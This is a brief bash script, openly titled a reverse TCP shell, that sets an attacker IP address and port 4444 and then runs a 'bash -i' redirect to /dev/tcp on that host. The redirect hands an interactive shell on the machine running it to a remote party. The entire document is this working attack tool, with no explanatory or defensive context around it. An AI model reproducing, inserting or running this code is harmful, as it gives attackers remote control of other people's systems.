#!/bin/bash
# Reverse TCP shell to attacker at IP and port

ATTACKER_IP="192.168.1.100"
ATTACKER_PORT="4444"

echo "[*] Connecting back to $ATTACKER_IP:$ATTACKER_PORT..."
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
